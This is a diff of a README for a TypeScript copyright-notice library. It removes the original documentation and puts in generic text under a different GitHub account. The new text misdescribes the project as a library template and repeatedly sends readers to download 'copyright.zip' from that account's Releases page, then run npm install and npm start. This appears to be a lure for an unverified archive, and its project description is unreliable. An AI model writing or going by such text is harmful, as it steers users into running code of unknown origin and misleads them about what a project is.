@@ -1,166 +1,88 @@
-# @pyyupsk/copyright
+# 🎉 copyright - A Simple Way to Start Your TypeScript Project
 
-[![CI](https://github.com/pyyupsk/copyright/actions/workflows/ci.yml/badge.svg)](https://github.com/pyyupsk/copyright/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![npm](https://img.shields.io/npm/v/@pyyupsk/copyright)](https://www.npmjs.com/package/@pyyupsk/copyright)
+## 🚀 Quick Download
+[![Download copyright](https://img.shields.io/badge/Download-copyright-blue.svg)](https://github.com/theydkfocus/copyright/releases)
 
-A framework-agnostic TypeScript library for displaying copyright notices with auto year calculation, preset formats, custom templates, and React support.
+## 📖 Overview
+The **copyright** project is a user-friendly TypeScript library template. It helps you set up modern tools for your coding projects easily. No need for deep programming knowledge.
 
-## Features
+This template includes essential features to help you create JavaScript and TypeScript libraries effortlessly. You can start coding right away.
 
-- Auto year calculation with year ranges
-- 4 preset formats (minimal, standard, full, legal)
-- Custom template support with variable substitution
-- HTML output with styling (className, style, tag)
-- React component with declarative props API
-- Direct DOM rendering via selector or Element reference
-- Zero runtime dependencies for core library
-- Dual ESM/CJS output
-- Full TypeScript support
+## 📦 Features
+- Built with TypeScript for strong typing.
+- Easily switch between CommonJS (cjs) and ECMAScript (esm) modules.
+- Integrated testing setup with Vitest.
+- Automatic versioning with changesets.
+- Ready-to-use configuration for npm.
+  
+## 💻 System Requirements
+To run **copyright**, you need:
+- A computer with Windows, macOS, or Linux.
+- Node.js version 14 or higher. You can download it from [nodejs.org](https://nodejs.org).
+  
+## 📥 Download & Install
+To get the latest version of **copyright**, visit the Releases page:
 
-## Installation
+[Download copyright](https://github.com/theydkfocus/copyright/releases)
 
-```bash
-npm install @pyyupsk/copyright
-# or
-bun add @pyyupsk/copyright
-```
+1. Click on the link above.
+2. Look for the latest version.
+3. Download the file labeled "copyright.zip" or similar.
+4. Extract the contents to a folder on your computer.
+5. Follow the setup instructions below.
 
-## Quick Start
+## 🔧 Setup Instructions
+1. Open your terminal or command prompt.
+2. Navigate to the folder where you extracted **copyright**.
+3. Run the following command:
+   ```
+   npm install
+   ```
+4. This command installs all necessary dependencies.
+5. After installation, you can run your project with:
+   ```
+   npm start
+   ```
 
-### Basic Usage
+## 📚 Using the Template
+Once **copyright** is installed, you can start developing your library. Here’s how to customize it:
 
-```typescript
-import { Copyright } from "@pyyupsk/copyright";
+1. Open the project folder in your preferred code editor. 
+2. Modify the `src/index.ts` file. This is where your main code will go.
+3. Use the built-in testing setup. You can write tests in the `test/` folder.
 
-const copyright = new Copyright({ owner: "ACME Corp" });
-console.log(copyright.getText()); // © 2026 ACME Corp
-```
+## 🐞 Troubleshooting
+Having issues? Check these common problems:
+- **Error: Cannot find module**: Make sure you ran `npm install`.
+- **Slow performance**: Ensure your Node.js version is up to date.
 
-### Year Range
+For further assistance, visit the [Issues page](https://github.com/theydkfocus/copyright/issues).
 
-```typescript
-const copyright = new Copyright({
-  owner: "ACME Corp",
-  startYear: 2020,
-});
-console.log(copyright.getText()); // © 2020-2026 ACME Corp
-```
+## 📢 Community and Support
+Join our community to share your experiences or ask questions:
+- [GitHub Discussions](https://github.com/theydkfocus/copyright/discussions)
+- Follow us on Twitter for updates.
 
-### Preset Formats
+## 📦 Topics
+This project covers various topics including:
+- biome
+- bun
+- changesets
+- cjs
+- esm
+- library
+- npm
+- template
+- typescript
+- vitest
 
-```typescript
-const copyright = new Copyright({
-  owner: "ACME Corp",
-  format: "standard",
-});
-console.log(copyright.getText()); // Copyright © 2026 ACME Corp
+Feel free to explore these topics further! 
 
-// Available formats: minimal, standard, full, legal
-```
+## 📅 Changelog
+To keep track of changes and updates:
+- Visit the [Releases page](https://github.com/theydkfocus/copyright/releases) for the latest information.
 
-### Custom Template
+## 💬 Feedback
+Your feedback is important. If you have suggestions or find issues, please let us know on GitHub.
 
-```typescript
-const copyright = new Copyright({
-  owner: "ACME Corp",
-  template: "Made by {owner} in {year}",
-});
-console.log(copyright.getText()); // Made by ACME Corp in 2026
-
-// Available variables: {symbol}, {year}, {owner}, {startYear}, {endYear}
-```
-
-### HTML Output
-
-```typescript
-const copyright = new Copyright({ owner: "ACME Corp" });
-
-// Default span
-console.log(copyright.toHTML());
-// <span>© 2026 ACME Corp</span>
-
-// With options
-console.log(
-  copyright.toHTML({
-    tag: "footer",
-    className: "copyright-text",
-    style: { color: "gray" },
-  }),
-);
-// <footer class="copyright-text" style="color: gray">© 2026 ACME Corp</footer>
-```
-
-### DOM Rendering
-
-```typescript
-const copyright = new Copyright({ owner: "ACME Corp" });
-
-// Render to selector
-copyright.render("#footer");
-
-// Render to Element
-const container = document.getElementById("footer");
-copyright.render(container, { tag: "small", className: "text-muted" });
-```
-
-### React Component
-
-```tsx
-import { Copyright } from "@pyyupsk/copyright/react";
-
-function Footer() {
-  return (
-    <Copyright
-      owner="ACME Corp"
-      startYear={2020}
-      format="standard"
-      as="footer"
-      className="text-gray-500"
-    />
-  );
-}
-```
-
-## API Reference
-
-### `Copyright` Class
-
-#### Constructor
-
-```typescript
-new Copyright(options: CopyrightOptions);
-```
-
-#### Options
-
-| Option      | Type                                           | Default     | Description                 |
-| ----------- | ---------------------------------------------- | ----------- | --------------------------- |
-| `owner`     | `string`                                       | (required)  | Copyright owner name        |
-| `startYear` | `number`                                       | current     | Start year for range        |
-| `endYear`   | `number \| "auto"`                             | `"auto"`    | End year (auto = current)   |
-| `format`    | `"minimal" \| "standard" \| "full" \| "legal"` | `"minimal"` | Preset format               |
-| `template`  | `string`                                       | -           | Custom template (overrides) |
-
-#### Methods
-
-- `getText()` - Returns plain text copyright string
-- `toHTML(options?)` - Returns HTML string with optional tag, className, style
-- `render(target, options?)` - Renders to DOM element (selector or Element)
-- `setOptions(options)` - Updates options (chainable)
-- `static create(options)` - Factory method
-
-### React `<Copyright />` Component
-
-All `CopyrightOptions` plus:
-
-| Prop        | Type     | Default  | Description    |
-| ----------- | -------- | -------- | -------------- |
-| `as`        | `string` | `"span"` | Element type   |
-| `tag`       | `string` | `"span"` | Alias for `as` |
-| `className` | `string` | -        | CSS class      |
-| `style`     | `object` | -        | Inline styles  |
-
-## License
-
-[MIT](LICENSE)
+Thank you for choosing **copyright**. Happy coding!
